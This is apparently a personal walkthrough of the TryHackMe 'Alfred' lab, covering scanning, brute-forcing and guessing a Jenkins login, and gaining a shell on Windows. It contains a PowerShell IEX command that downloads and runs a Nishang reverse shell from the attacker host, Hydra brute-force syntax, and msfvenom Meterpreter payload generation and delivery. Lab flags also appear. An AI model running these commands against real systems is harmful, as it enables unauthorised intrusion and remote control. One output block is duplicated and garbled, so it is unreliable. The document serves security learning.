Alfred
------

Looks like this room we will be exploring Jenkins to gain full remote access.

As a start we will use Nishang (https://github.com/samratashok/nishang) to gain
initial access. In this case the reverse shell scripts (https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1)

NOTE: This is Windows, and should not respond to icmp ping.


DISCOVERY Phase:

PING:
-----
# ping 10.10.30.0
PING 10.10.30.0 (10.10.30.0) 56(84) bytes of data.
^C
--- 10.10.30.0 ping statistics ---
11 packets transmitted, 0 received, 100% packet loss, time 10224ms

As suggested, we got no response.


NMAP:
-----
# nmap -sS -sV -oN alfred.nmap 10.10.30.0

Starting Nmap 7.60 ( https://nmap.org ) at 2022-10-16 11:38 BST
Nmap scan report for ip-10-10-30-0.eu-west-1.compute.internal (10.10.30.0)
Host is up (0.00043s latency).
Not shown: 997 filtered ports
PORT     STATE SERVICE    VERSION
80/tcp   open  http       Microsoft IIS httpd 7.5
3389/tcp open  tcpwrapped
8080/tcp open  http       Jetty 9.4.z-SNAPSHOT
MAC Address: 02:77:29:34:18:71 (Unknown)
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 22.81 seconds

Web:
----
Checked the webpage. It was was RIP page for Bruce Wayne lol

RIP Bruce Wayne

Donations to alfred@wayneenterprises.com are greatly appreciated. 
---

The page source is short and simple:
---
<html>
<head>
<style>
* {font-family: Arial;}
</style>
</head>
<body><center><br />
<img width="200" height+"300" src="bruce.jpg"><br /><br />
RIP Bruce Wayne<br /><br />
Donations to <strong>alfred@wayneenterprises.com</strong> are greatly appreciated.
</center></body>
</html>
---

Sono script here or anything.

Question1: How many TCP Ports open?
3

Question2: What is the username and Password for the login panel (formate username:login)

I didn't see a login panel so I'm going to have to use dirbuster or something and see if I can find that next. Oh wait I saw 8080/tcp, let me check that 1st.

Ok looks like there is a Jenkins login there.

I checked it with Burpsuite and found this:
http://10.10.205.145:8080/j_acegi_security_check

so we have:
URL: http://10.10.205.145:8080/j_acegi_security_check
USER: j_username
PASS: j_password
PORT: 8080
Invalid Login: "Invalid username or password"

I was going to just use Burpsuite Intruder but forgot I couldn't load a large list like rockyou.txt so I decided to use Hydra.

```
┌──(kali㉿kali)-[/usr/share/wordlists]
└─$ hydra -s 8080 10.10.205.145 http-form-post '/j_acegi_security_check:j_username=^USER^&j_password=^PASS^:Invalid username or password' -L /home/kali/user.txt -P /usr/share/wordlists/rockyou.txt -t 10 -w 30
Hydra v9.3 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2022-10-16 22:20:57
[DATA] max 10 tasks per 1 server, overall 10 tasks, 14344399 login tries (l:1/p:14344399), ~1434440 tries per task
[DATA] attacking http-post-form://10.10.205.145:8080/j_acegi_security_check:j_username=^USER^&j_password=^PASS^:Invalid username or password
[STATUS] 222.00 tries/min, 222 tries in 00:01h, 14344177 to do in 1076:54h, 10 active
[STATUS] 224.33 tries/min, 673 tries in 00:03h, 14343726 to do in 1065:40h, 10 active
[ERROR] Can not create restore file (./hydra.restore) - Permission denied
[STATUS] 218.29 tries/min, 1528 tries in 00:07h, 14342871 to do in 1095:07h, 10 active
[STATUS] 219.73 tries/min, 3296 tries in 00:15h, 14341103 to do in 1087:46h, 10 active

```
So while this was running I guessed the correct user/passwd.

admin:admin

So I logged into Jenkins. We use this quite a bit at work so its possible to get it to run some script on the backend.

I clicked on Project, clicked on Configure, then the script console. 

I used this:
print "powershell IEX(New-Object Net.WebClient).downloadString('http://10.10.118.20/Invoke-PowershellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress 10.10.118.20 -Port 443".execute().text

IT kept crashing over and over.

So I tried the shell console from the config menu. It also crashed and spit out errors.


Before I executed however, I setup a python webserver:

┌──(kali㉿kali)-[~/scripts/nishang/Shells]
└─$ ls
Invoke-ConPtyShell.ps1  Invoke-PoshRatHttps.ps1              Invoke-PowerShellTcp.ps1         Invoke-PsGcatAgent.ps1
Invoke-JSRatRegsvr.ps1  Invoke-PowerShellIcmp.ps1            Invoke-PowerShellUdpOneLine.ps1  Invoke-PsGcat.ps1
Invoke-JSRatRundll.ps1  Invoke-PowerShellTcpOneLineBind.ps1  Invoke-PowerShellUdp.ps1         Remove-PoshRat.ps1
Invoke-PoshRatHttp.ps1  Invoke-PowerShellTcpOneLine.ps1      Invoke-PowerShellWmi.ps1
                                                                                                                                     
┌──(kali㉿kali)-[~/scripts/nishang/Shells]
└─$ python3 -m http.server     
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...

Then in another terminal:

┌──(kali㉿kali)-[~]
└─$ nc -lvnp 443
listening on [any] 4443 ...

So I gave up trying to make this work on vpn and switched over to the Attackbox on THM. I suspect some routing issues between here and my nearest server in eastern EU. Since my earlier box crashed I think the network was broken. 

I didn't feel like pulling down another vpn config so I just did that and finished this task.

Quite frustrating I must say.

root@ip-10-10-118-20:~# python3 -m http.server 8000
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
10.10.65.45 - - [16/Oct/2022 15:49:26] "GET /Invoke-PowerShellTcp.ps1 HTTP/1.1" 200 -

So, with a working network, it did pull the file down and on the listner:

PS C:\Program Files (x86)\Jenkins>whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                  Description                               State   
=============================== ========================================= ========
SeIncreaseQuotaPrivilege        Adjust memory quotas for a process        Disabled
SeSecurityPrivilege             Manage auditing and security log          Disabled
SeTakeOwnershipPrivilege        Take ownership of files or other objects  Disabled
SeLoadDriverPrivilege           Load and unload device drivers            Disabled
SeSystemProfilePrivilege        Profile system performance                Disabled
SeSystemtimePrivilege           Change the system time                    Disabled
SeProfileSingleProcessPrivilege Profile single process                    Disabled
SeIncreaseBasePriorityPrivilege Increase scheduling priority              Disabled
SeCreatePagefilePrivilege       Create a pagefile                         Disabled
SeBackupPrivilege               Back up files and directories             Disabled
SeRestorePrivilege              Restore files and directories             Disabled
SeShutdownPrivilege             Shut down the system                      Disabled
SeDebugPrivilege                Debug programs                            Enabled 
SeSystemEnvironmentPrivilege    Modify firmware environment values        Disabled
SeChangeNotifyPrivilege         Bypass traverse checking                  Enabled 
SeRemoteShutdownPrivilege       Force shutdown from a remote system       Disabled
SeUndockPrivilege               Remove computer from docking station      Disabled
SeManageVolumePrivilege         Perform volume maintenance tasks          Disabled
SeImpersonatePrivilege          Impersonate a client after authentication Enabled 
SeCreateGlobalPrivilege         Create global objects                     Enabled 
SeIncreaseWorkingSetPrivilege   Increase a process working set            Disabled
SeTimeZonePrivilege             Change the time zone                      Disabled
SeCreateSymbolicLinkPrivilege   Create symbolic links                     Disabled

So for interesting stuff here, looks like we can impersonate and create global privs. Good.. I can work with that.

Further enumberating:

I find this secret file under the Jenkins directory:
cb2ae36e1862a23b3adfd393282eae76f896f2efb0a4da79643e33afc616751e


Then going to C:/Users/bruce/Desktop I get the user.txt flag:
79007a09481963edf2e1321abd9ae2a0

TASK2 - Switching Shells
----------------------------------------

In this task we are going to change shells to something more stable like Meterpreter.

We'll generate a payload in msfvenon, upload it via python webserver through the same Jenkins tool and listen via Metasploits exploit/multi/handler -> windows/meterpreter/reverse_tcp 

Let's generate the payload:

root@ip-10-10-23-30:~# msfvenom -p windows/meterpreter/reverse_tcp -a x86 --encoder x86/shikata_ga_nai LHOST=10.10.23.30 LPORT=4444 -f exe -o backdoor.exe
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
Found 1 compatible encoders
Attempting to encode payload with 1 iterations of x86/shikata_ga_nai
x86/shikata_ga_nai succeeded with size 368 (iteration=0)
x86/shikata_ga_nai chosen with final size 368
Payload size: 368 bytes
Final size of exe file: root@ip-10-10-23-30:~# msfvenom -p windows/meterpreter/reverse_tcp -a x86 --encoder x86/shikata_ga_nai LHOST=10.10.23.30 LPORT=4444 -f exe -o backdoor.exe
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
Found 1 compatible encoders
Attempting to encode payload with 1 iterations of x86/shikata_ga_nai
x86/shikata_ga_nai succeeded with size 368 (iteration=0)
x86/shikata_ga_nai chosen with final size 368
Payload size: 368 bytes
Final size of exe file: 73802 bytes
Saved as: backdoor.exe
 bytes
Saved as: backdoor.exe

The size of this should be the answer to the only question in Task2.

What is the final size of the exe payload that you generated?
73802

Now run this powershell in Jenkins script console:
powershell "(New-Object System.Net.WebClient).Downloadfile('http://10.10.23.30:8000/backdoor.exe','backdoor.exe')"




